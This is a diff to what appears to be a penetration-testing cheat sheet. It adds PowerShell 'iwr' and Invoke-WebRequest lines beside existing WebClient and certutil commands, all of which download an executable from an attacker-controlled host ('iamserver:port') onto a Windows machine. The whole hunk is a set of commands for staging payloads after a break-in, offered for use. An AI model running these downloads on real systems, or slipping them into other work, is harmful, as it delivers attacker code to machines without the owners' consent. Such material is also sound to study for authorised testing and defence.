@@ -58,7 +58,11 @@ service apache2 start
 ```bash
 powershell -c (new-object System.Net.WebClient).DownloadFile('http://iamserver:port/xxxx.exe','C:\download\path\xxxx.exe')
 # If the abouve one fails
+# with aliases
+iwr -uri 'http://iamserver:port/xxxx.exe' -o 'C:\download\path\xxxx.exe'
+# with commandlet
 powershell.exe -command Invoke-WebRequest -Uri 'http://iamserver:port/xxxx.exe' -OutFile 'C:\download\path\xxxx.exe'
+
 # file transfer when only cmd is available, output just like wget
 certutil -urlcache -f http://iamserver:port/xxxx.exe xxxx.exe
 ```
